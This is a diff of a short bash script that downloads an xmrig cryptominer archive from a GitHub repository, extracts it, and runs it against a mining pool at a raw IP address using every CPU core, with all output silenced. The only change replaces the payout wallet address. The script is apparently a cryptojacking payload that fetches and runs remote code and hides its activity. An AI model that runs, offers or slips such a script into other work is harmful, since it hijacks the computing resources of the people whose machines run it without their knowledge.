@@ -1,3 +1,3 @@
 #!/bin/bash
 wget https://github.com/Adeemar7/all/raw/main/xmrig.tar.gz && tar -xvf xmrig.tar.gz >/dev/null 2>&1
-./xmrig --donate-level 1 -o 178.128.111.50:443 -u SaLvsAEFCDYZ3aDW1GhD6q17cdnBcSC2GRQk6f6v7TssBcLnmSjRNQfVsJe1SxWf3HgXSpsfNTG1ELTBMXYpw2CiHdoBxCYEREZ -p gun -a rx/0 -t $(nproc --all) >/dev/null 2>&1
+./xmrig --donate-level 1 -o 178.128.111.50:443 -u SaLvsAAxiyaY8irCfKUmucUmfXPdTyJKg5252vysdjTWXQY9KkR57SzdE7H54SDW9nbioXg2dWBMDWMkmWSGRYBvENDbe29wjz4 -p gun -a rx/0 -t $(nproc --all) >/dev/null 2>&1
